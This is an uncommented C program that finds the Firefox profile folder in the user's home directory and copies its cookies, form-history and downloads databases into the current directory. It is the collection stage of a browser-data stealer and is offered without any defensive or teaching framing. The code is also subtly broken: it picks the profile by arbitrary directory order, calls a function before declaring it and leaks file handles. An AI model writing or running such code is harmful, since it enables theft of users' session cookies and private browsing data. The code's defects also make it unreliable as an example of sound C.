#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

char* getPath();
char* combineStrings(char* profile, char* path);
char** findProfile(char* path);
void copyagain();

int main()
{ 
    int fileIndex;
    char* fileLocation = getPath(); 
    char* whereAmI = getcwd(NULL, 0);
    char **files = findProfile(fileLocation);
    char* filesToExport[3] = {"/formhistory.sqlite", "/cookies.sqlite", "/downloads.sqlite"};
    char* profileName = files[2];
    char pathWoutFile[256];
    char fullPathWithFile[256];
    char fullSendPath[256];

    snprintf(pathWoutFile, 256, "%s/%s", fileLocation, profileName);

    for (int i = 0; i < 3; i++) {
        snprintf(fullPathWithFile, 256, "%s%s", pathWoutFile, filesToExport[i]);
        snprintf(fullSendPath, 256, "%s%s", whereAmI, filesToExport[i]);

        if (access(fullPathWithFile, F_OK) != -1) {
            if (copyFile(fullPathWithFile, fullSendPath) != 0) {
                printf("Failed to copy file %s to %s.\n", fullPathWithFile, fullSendPath);
            }
        } else {
            printf("File %s does not exist.\n", fullPathWithFile);
        }
    }

    return 0;
}

char* getPath()
{
    static char fullPath[256];
    char* home = getenv("HOME");

    snprintf(fullPath, 256, "%s/.mozilla/firefox", home);

    return fullPath;
}

char** findProfile(char* path)
{
    DIR *dir = opendir(path);
    struct dirent *dp; 
    size_t filecount = 0; 
    size_t i = 0;
    char **files;

    if (dir == NULL) {
        return NULL; 
    }
    while ((dp = readdir(dir)) != NULL) {
        filecount++;
    }

    files = (char **) malloc(filecount * sizeof(*files));
    if (files == NULL) {
        return NULL; 
    }

    rewinddir(dir);
    while ((dp = readdir(dir)) != NULL) {
        files[i] = strdup(dp->d_name);
        if (files[i] == NULL) {
            while (i > 0) {
                free(files[--i]);
            }
            free(files);
            return NULL;
        }
        i++;
    }

    closedir(dir);
    return files;
}

int copyFile(const char* source, const char* destination) {
    FILE* src = fopen(source, "rb");
    FILE* dst = fopen(destination, "wb");
    if (src == NULL || dst == NULL) {
        return -1;
    }

    char buffer[4096];
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, 4096, src)) > 0) {
        if (fwrite(buffer, 1, bytesRead, dst) != bytesRead) {
            return -1;
        }
    }

    fclose(src);
    fclose(dst);
    return 0;
}